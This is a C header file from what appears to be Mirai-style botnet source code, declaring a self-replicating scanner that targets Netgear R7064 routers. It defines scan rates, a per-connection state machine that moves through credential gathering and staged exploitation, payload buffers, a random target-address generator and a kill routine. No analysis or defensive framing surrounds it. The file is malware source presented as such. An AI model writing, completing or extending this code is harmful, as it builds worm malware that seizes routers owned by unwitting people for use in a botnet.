#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define netgear_r7064_SCANNER_MAX_CONNS   3
#define netgear_r7064_SCANNER_RAW_PPS     788
#else
#define netgear_r7064_SCANNER_MAX_CONNS   256
#define netgear_r7064_SCANNER_RAW_PPS     788
#endif

#define netgear_r7064_SCANNER_RDBUF_SIZE  1080
#define netgear_r7064_SCANNER_HACK_DRAIN  64

struct netgear_r7064_scanner_connection
{
    int fd, last_recv;
    enum
    {
        netgear_r7064_SC_CLOSED,
        netgear_r7064_SC_CONNECTING,
        netgear_r7064_SC_GET_CREDENTIALS,
        netgear_r7064_SC_EXPLOIT_STAGE2,
        netgear_r7064_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[netgear_r7064_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void netgear_r7064_scanner();
void netgear_r7064_kill(void);

static void netgear_r7064_setup_connection(struct netgear_r7064_scanner_connection *);
static ipv4_t get_random_netgear_r7064_ip(void);

#endif
